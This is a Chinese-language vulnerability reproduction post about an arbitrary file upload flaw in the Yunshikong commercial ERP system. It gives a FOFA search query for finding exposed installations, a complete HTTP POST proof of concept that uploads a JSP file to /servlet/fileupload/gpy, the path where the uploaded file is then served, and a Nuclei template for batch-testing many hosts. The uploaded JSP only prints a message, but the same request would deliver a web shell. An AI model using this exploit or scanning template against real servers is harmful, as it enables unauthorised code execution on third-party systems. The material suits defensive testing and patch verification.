# 原创
：  漏洞复现--云时空商业ERP文件上传

# 漏洞复现--云时空商业ERP文件上传

## 免责声明：

**文章中涉及的漏洞均已修复，敏感信息均已做打码处理，文章仅做经验分享用途，切勿当真，未授权的攻击属于非法行为！文章中敏感信息均已做多层打马处理。传播、利用本文章所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任，一旦造成后果请自行负责**

### 一：漏洞描述

云时空商业ERP以大型集团供应链系统为支撑，是基于互联网技术的多渠道模式营销服务管理体系，可以帮助您整合线上和线下交易模式，覆盖企业经营管理应用各个方面。该产品存在任意文件上传漏洞，攻击者可通过此漏洞获取服务器权限。

### 二：漏洞影响版本

不详

### 三：网络空间测绘查询

fofa:<br/> `app="云时空社会化商业ERP系统"`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/81bca6fb24cfa34031e830356061aa28.jpeg"/>

### 四：漏洞复现

<img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/0ad9dc37ac955fdfecb45926f7af2135.jpeg"/><br/> POC:

```
POST /servlet/fileupload/gpy HTTP/1.1
Host:x.x.x.x
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=4eea98d02AEa93f60ea08dE3C18A1388
Content-Length: 215

--4eea98d02AEa93f60ea08dE3C18A1388
Content-Disposition: form-data; name="file1"; filename="test.jsp"
Content-Type: application/octet-stream
 
&lt;% out.println("This website has a vulnerability"); %&gt;
--4eea98d02AEa93f60ea08dE3C18A1388--

```

<img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/77fa68cfbd0b4e9d762889333857ae05.jpeg"/><br/> 访问/uploads/pics/【返回的日期】/【上传文件名称】<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/bd150ab1848235cf6cd1f544715ad1c4.jpeg"/><br/> 成功解析

### 五：批量验证

```
id: yun-shiKong-Upload

info:
  name: yun-shiKong-Upload
  author: 芝士土拨鼠
  severity: high
  description: 云时空商业ERP以大型集团供应链系统为支撑，是基于互联网技术的多渠道模式营销服务管理体系，可以帮助您整合线上和线下交易模式，覆盖企业经营管理应用各个方面。该产品存在任意文件上传漏洞，攻击者可通过此漏洞获取服务器权限。

requests:
  - raw:
      - "POST /servlet/fileupload/gpy HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0\
        \ (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0\nAccept:\
        \ text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\n\
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\n\
        Accept-Encoding: gzip, deflate\nConnection: close\nUpgrade-Insecure-Requests:\
        \ 1\nContent-Type: multipart/form-data; boundary=4eea98d02AEa93f60ea08dE3C18A1388\n\
        Content-Length: 213\n\n--4eea98d02AEa93f60ea08dE3C18A1388\nContent-Disposition:\
        \ form-data; name=\"file1\"; filename=\"test.jsp\"\nContent-Type: application/octet-stream\n\
        \ \n&lt;% out.println(\"This website has a vulnerability\"); %&gt;\n--4eea98d02AEa93f60ea08dE3C18A1388--"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - fileRealName
      - type: status
        status:
          - 200

```

### 六：修复方案

联系厂家获取漏洞修复补丁
